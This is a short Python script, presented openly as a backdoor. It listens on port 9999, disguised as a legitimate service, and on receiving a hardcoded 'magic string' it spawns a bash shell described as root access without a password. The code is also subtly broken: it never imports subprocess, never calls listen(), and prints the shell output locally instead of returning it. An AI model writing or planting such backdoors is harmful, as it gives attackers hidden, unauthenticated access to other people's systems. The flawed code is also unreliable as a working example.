import socket

# Hardcoded "magic string" for authentication bypass
MAGIC_STRING = b'\x41\x42\x43\x44\x45'

def bind_to_port(port):
    # Bind to a non-standard network port pretending to be a legitimate service
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', port))
    return server_socket

def check_auth(data):
    # Check incoming data for the hardcoded "magic string"
    if data == MAGIC_STRING:
        return True
    else:
        return False

def get_root_shell():
    # Grant root/admin shell without requiring a system password
    return subprocess.Popen(['/bin/bash'])

if __name__ == "__main__":
    port = 9999

    server_socket = bind_to_port(port)
    
    while True:
        client_socket, fromaddr = server_socket.accept()
        data = client_socket.recv(1024)

        if check_auth(data):
            # Client is authenticated - give root shell
            root_shell = get_root_shell()
            output = root_shell.communicate(input='ls\n')
            print(output)
        
        else:
            # Client is not authenticated - ignore connection
            client_socket.close()

